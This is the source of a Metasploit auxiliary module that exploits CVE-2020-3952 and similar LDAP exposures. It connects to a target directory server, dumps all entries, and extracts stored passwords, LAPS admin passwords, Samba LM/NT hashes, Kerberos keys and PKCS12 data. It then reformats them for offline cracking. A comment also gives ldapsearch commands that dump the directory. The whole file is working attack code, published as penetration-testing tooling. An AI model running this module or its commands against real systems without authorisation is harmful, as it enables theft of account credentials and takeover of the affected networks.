##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::LDAP
  include Msf::OptionalSession::LDAP

  PASSWORD_ATTRIBUTES = %w[clearpassword mailuserpassword ms-mcs-admpwd password passwordhistory pwdhistory sambalmpassword sambantpassword userpassword userpkcs12]

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LDAP Password Disclosure',
        'Description' => %q{
          This module will gather passwords and password hashes from a target LDAP server via multiple techniques.
        },
        'Author' => [
          'Spencer McIntyre', # LAPS updates
          'Hynek Petrak' # Discovery, module
        ],
        'References' => [
          ['CVE', '2020-3952'],
          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
        ],
        'DisclosureDate' => '2020-07-23',
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Dump', { 'Description' => 'Dump all LDAP data' }]
        ],
        'DefaultAction' => 'Dump',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptInt.new('READ_TIMEOUT', [false, 'LDAP read timeout in seconds', 600]),
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
      OptString.new('USER_ATTR', [false, 'LDAP attribute(s), that contains username', '']),
      OptString.new('PASS_ATTR', [
        false, 'Additional LDAP attribute(s) that contain password hashes',
        ''
        # Other potential candidates:
        # ipanthash, krbpwdhistory, krbmkey, unixUserPassword, krbprincipalkey, radiustunnelpassword, sambapasswordhistory
      ])
    ])
  end

  def print_prefix
    "#{peer.ljust(21)} - "
  end

  # PoC using ldapsearch(1):
  #
  # Retrieve root DSE with base DN:
  #   ldapsearch -xb "" -s base -H ldap://[redacted]
  #
  # Dump data using discovered base DN:
  #   ldapsearch -xb bind_dn -H ldap://[redacted] \* + -
  def run_host(_ip)
    @read_timeout = datastore['READ_TIMEOUT'] || 600

    entries_returned = 0

    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if datastore['BASE_DN'].blank?
        fail_with(Failure::UnexpectedReply, "Couldn't discover base DN!") unless ldap.base_dn
        base_dn = ldap.base_dn
        print_status("Discovered base DN: #{base_dn}")
      else
        base_dn = datastore['BASE_DN']
      end

      if datastore['USER_ATTR'].present?
        vprint_status("Using the '#{datastore['USER_ATTR']}' attribute as the username")
      end

      print_status("Searching base DN: #{base_dn}")
      entries_returned += ldap_search(ldap, base_dn, base: base_dn)
    end

    # Safe if server did not return anything
    unless (entries_returned > 0)
      fail_with(Failure::NotVulnerable, 'Server did not return any data, seems to be safe')
    end
  rescue Timeout::Error
    fail_with(Failure::TimeoutExpired, 'The timeout expired while searching directory')
  rescue Net::LDAP::PDU::Error, Net::BER::BerError, Net::LDAP::Error, NoMethodError => e
    fail_with(Failure::UnexpectedReply, "Exception occurred: #{e.class}: #{e.message}")
  end

  def ldap_search(ldap, base_dn, args)
    entries_returned = 0
    creds_found = 0
    def_args = {
      base: '',
      return_result: false,
      attributes: %w[* + -]
    }

    begin
      # HACK: fix lack of read/write timeout in Net::LDAP
      Timeout.timeout(@read_timeout) do
        ldap.search(def_args.merge(args)) do |entry|
          entries_returned += 1
          password_attributes.each do |attr|
            if entry[attr].any?
              creds_found += process_hash(entry, attr)
            end
          end
        end
      end
    rescue Timeout::Error
      print_error("Host timeout reached while searching '#{base_dn}'")
      return entries_returned
    ensure
      if entries_returned > 0
        print_status("Found #{entries_returned} entries and #{creds_found} credentials in '#{base_dn}'.")
      elsif ldap.get_operation_result.code == 0
        print_error("No entries returned for '#{base_dn}'.")
      end
    end

    entries_returned
  end

  def password_attributes
    attributes = PASSWORD_ATTRIBUTES.dup
    if datastore['PASS_ATTR'].present?
      attributes += datastore['PASS_ATTR'].split(/[,\s]+/).compact.reject(&:empty?).map(&:downcase)
    end

    attributes
  end

  def decode_pwdhistory(hash)
    # https://ldapwiki.com/wiki/PwdHistory
    parts = hash.split('#', 4)
    unless parts.length == 4
      return hash
    end

    hash = parts.last
    unless hash.starts_with?('{')
      decoded = Base64.decode64(hash)
      if decoded.starts_with?('{') || (decoded =~ /[^[:print:]]/).nil?
        return decoded
      end
    end
    hash
  end

  def process_hash(entry, attr)
    creds_found = 0
    username = [datastore['USER_ATTR'], 'sAMAccountName', 'dn', 'cn'].map { entry[_1] }.reject(&:blank?).first.first

    entry[attr].each do |private_data|
      if attr == 'pwdhistory'
        private_data = decode_pwdhistory(private_data)
      end

      # 20170619183528ZHASHVALUE
      if attr == 'passwordhistory' && private_data.start_with?(/\d{14}Z/i)
        private_data.slice!(/\d{14}Z/i)
      end

      # Cases *[crypt}, !{crypt} ...
      private_data.gsub!(/.?{crypt}/i, '{crypt}')

      # We observe some servers base64 encode the hash string
      # and add {crypt} prefix to the base64 encoded value
      # e2NyeXB0f in base64 means {crypt, e3NtZD is {smd
      if private_data.starts_with?(/{crypt}(e2NyeXB0f|e3NtZD)/)
        begin
          private_data = Base64.strict_decode64(private_data.delete_prefix('{crypt}'))
        rescue ArgumentError
          nil
        end
      end

      # Some have new lines at the end
      private_data.chomp!

      # Skip empty or invalid hashes, e.g. '{CRYPT}x', xxxx, ****
      next if private_data.blank?
      next if private_data.start_with?(/{crypt}/i) && private_data.length < 10
      next if private_data.start_with?('*****') || private_data == '*'
      next if private_data.start_with?(/xxxxx/i, /yyyyyy/i)
      next if private_data.end_with?('*LK*', '*NP*') # account locked, or never set
      next if private_data =~ /{sasl}/i # reject {SASL} pass-through

      if attr =~ /^samba(lm|nt)password$/
        next if private_data.length != 32
        next if private_data.case_cmp?('aad3b435b51404eeaad3b435b51404ee') || private_data.case_cmp?('31d6cfe0d16ae931b73c59d7e0c089c0')
      end

      # observed sambapassword history with either 56 or 64 zeros
      next if attr == 'sambapasswordhistory' && private_data =~ /^(0{64}|0{56})$/

      jtr_format = nil

      case attr
      when 'sambalmpassword'
        jtr_format = 'lm'
      when 'sambantpassword'
        jtr_format = 'nt'
      when 'sambapasswordhistory'
        # 795471346779677A336879366B654870 1F18DC5E346FDA5E335D9AE207C82CC9
        # where the left part is a salt and the right part is MD5(Salt+NTHash)
        # attribute value may contain multiple concatenated history entries
        # for john sort of 'md5($s.md4(unicode($p)))' - not tested
        jtr_format = 'sambapasswordhistory'
      when 'krbprincipalkey'
        jtr_format = 'krbprincipal'
        # TODO: krbprincipalkey is asn.1 encoded string. In case of vmware vcenter 6.7
        # it contains user password encrypted with (23) rc4-hmac and (18) aes256-cts-hmac-sha1-96:
        # https://github.com/vmware/lightwave/blob/d50d41edd1d9cb59e7b7cc1ad284b9e46bfa703d/vmdir/server/common/krbsrvutil.c#L480-L558
        # Salted with principal name:
        # https://github.com/vmware/lightwave/blob/c4ad5a67eedfefe683357bc53e08836170528383/vmdir/thirdparty/heimdal/krb5-crypto/salt.c#L133-L175
        # In the meantime, dump the base64 encoded value.
        private_data = Base64.strict_encode64(private_data)
      when 'userpkcs12'
        # if we get non printable chars, encode into base64
        if (private_data =~ /[^[:print:]]/).nil?
          jtr_format = 'pkcs12'
        else
          jtr_format = 'pkcs12-base64'
          private_data = Base64.strict_encode64(private_data)
        end
      else
        if private_data.start_with?(/{crypt}.?\$1\$/i)
          private_data.gsub!(/{crypt}.{,2}\$1\$/i, '$1$')
          jtr_format = 'md5crypt'
        elsif private_data.start_with?(/{crypt}/i) && private_data.length == 20
          # handle {crypt}traditional_crypt case, i.e. explicitly set the hash format
          private_data.slice!(/{crypt}/i)
          # FIXME: what is the right jtr_hash - des,crypt or descrypt ?
          # identify_hash returns des,crypt, while JtR acceppts descrypt
          jtr_format = 'descrypt'
        # TODO: not sure if we shall slice the prefixes here or in the JtR/Hashcat formatter
        # elsif hash.start_with?(/{sha256}/i)
        #  hash.slice!(/{sha256}/i)
        #  hash_format = 'raw-sha256'
        else
          # handle vcenter vmdir binary hash format
          if private_data[0].ord == 1 && private_data.length == 81
            _type, private_data, salt = private_data.unpack('CH128H32')
            private_data = "$dynamic_82$#{private_data}$HEX$#{salt}"
          else
            # Remove LDAP's {crypt} prefix from known hash types
            private_data.gsub!(/{crypt}.{,2}(\$[0256][aby]?\$)/i, '\1')
          end
          jtr_format = Metasploit::Framework::Hashes.identify_hash(private_data)
        end
      end

      # highlight unresolved hashes
      jtr_format = '{crypt}' if private_data =~ /{crypt}/i

      print_good("Credentials (#{jtr_format || 'password'}) found in #{attr}: #{username}:#{private_data}")

      report_creds(username, private_data, jtr_format)
      creds_found += 1
    end

    creds_found
  end

  def report_creds(username, private_data, jtr_format)
    # this is the service the credentials came from, not necessarily where they can be used
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'ldap',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      status: Metasploit::Model::Login::Status::UNTRIED,
      private_data: private_data,
      private_type: (jtr_format.nil? ? :password : :nonreplayable_hash),
      jtr_format: jtr_format,
      username: username
    }.merge(service_data)

    cl = create_credential_and_login(credential_data)
    cl.respond_to?(:core_id) ? cl.core_id : nil
  end
end
